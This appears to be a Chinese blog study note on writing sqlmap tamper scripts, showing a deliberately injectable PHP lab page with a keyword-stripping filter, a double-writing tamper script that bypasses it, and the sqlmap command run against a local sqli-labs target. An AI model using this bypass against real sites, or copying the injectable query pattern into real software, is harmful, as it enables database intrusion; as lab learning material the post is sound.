# SQLMAP --TAMPER的编写

跟着师傅的文章进行学习

 [sqlmap之tamper脚本编写_sqlmap tamper编写-CSDN博客](https://blog.csdn.net/qq_44159028/article/details/119111707) 

这里学习一下tamper的编写

这里的tamper 其实就是多个绕过waf的插件 通过编写tamper 我们可以学会

在不同过滤下 执行sql注入

我们首先了解一下 tamper的结构

这里我们首先看一个最简单的例子

```python
from lib.core.enums import PRIORITY
 
__priority__ = PRIORITY.LOWEST
 
def dependencies():
    pass
def tamper(payload,**kwargs):
    return payload.replace("'","\\'").replace('"','\\"')
```

这里的例子我们可以发现

我们可以通过设置  


```markdown
__priority__: 当多个tamper被使用时的优先级
 
            （LOWEST、LOWER、LOW、NORMAL、HIGH、HIGHER、HIGHEST）

tamper  对payload的处理 这里是将 双引号 单引号都加上 \\
```

我们来根据题目进行测试吧

```php
function sqlwaf( $str ) {
	$str = str_ireplace( "and", "", $str );
	$str = str_ireplace( "or", "", $str );
	$str = str_ireplace( "union", "", $str );
	$str = str_ireplace( "select", "", $str );
	$str = str_ireplace( "sleep", "", $str );
	$str = str_ireplace( "group", "", $str );
	$str = str_ireplace( "extractvalue", "", $str );
	$str = str_ireplace( "updatexml", "", $str );
	$str = str_ireplace( "PROCEDURE", "", $str );
	
	return $str;
}
```

增加过滤 将这些替换为空 这里其实我们本身已经知道如何注入了 双写绕过即可

```php
<?php
echo '<h1>参数是 id 方式是GET</h1>';
$dbhost = '172.18.224.108';  // mysql服务器主机地址
$dbuser = 'root';            // mysql用户名
$dbpass = 'root';          // mysql用户名密码
$conn = mysqli_connect($dbhost, $dbuser, $dbpass);
function sqlwaf( $str ) {
	$str = str_ireplace( "and", "", $str );
	$str = str_ireplace( "or", "", $str );
	$str = str_ireplace( "union", "", $str );
	$str = str_ireplace( "select", "", $str );
	$str = str_ireplace( "sleep", "", $str );
	$str = str_ireplace( "group", "", $str );
	$str = str_ireplace( "extractvalue", "", $str );
	$str = str_ireplace( "updatexml", "", $str );
	$str = str_ireplace( "PROCEDURE", "", $str );
	
	return $str;
}
// 设置编码，防止中文乱码
mysqli_query($conn , "set names utf8");
$a = sqlwaf($_GET['id']);
echo $d;
if($a){
    $sql = "SELECT * FROM user where id = '$a'";
}
 
mysqli_select_db( $conn, 'test' );
$retval = mysqli_query( $conn, $sql );
if(! $retval )
{
    die( mysqli_error($conn));
}
echo '<h2>SQL 注入测试</h2>';
echo '<table border="1"><tr><td>ID</td><td>NAME</td><td>PASSWD</td>';
while($row = mysqli_fetch_array($retval, MYSQLI_NUM))
{
    echo "<tr><td> {$row[0]}</td> ".
         "<td>{$row[1]} </td> ".
         "<td>{$row[2]} </td> ".
         "</tr>";
}
echo '</table>';
mysqli_close($conn);
?>
```

但是我们如何在tamper中体现呢

我们首先进行正常注入看看是否成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/d83f713979daf62616bb5b52aa07c9c7.png" alt="" style="max-height:120px; box-sizing:content-box;" />


发现这里就注入失败了 无法实现注入

所以我们开始修改tamper

```cobol
from lib.core.enums import PRIORITY
 
__priority__ = PRIORITY.NORMAL
 
def dependencies():
    pass
def tamper(payload,**kwargs):
    return payload.replace("OR","oorr").replace('UNION','uniunionon').replace('SELECT','selselectect').replace("PROCEDURE", "PROCEPROCEDUREURE").replace("SLEEP", "slesleepep").replace("GROUP", "grogroupup").replace("EXTRACTVALUE", "extractvextractvaluealue").replace("UPDATEXML", "updatupdatexmlexml")
```

就是很简单的对payload进行操作 将所有过滤的内容实现绕过即可

然后我们再次进行注入

```cobol
py3 .\sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=1%27
 --tamper=waf1.py -v3
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/554c480590ac7f8b17cb9ecc47c3613c.png" alt="" style="max-height:398px; box-sizing:content-box;" />


注入成功

这是最简单的 tamper 后续写就要按照题目来了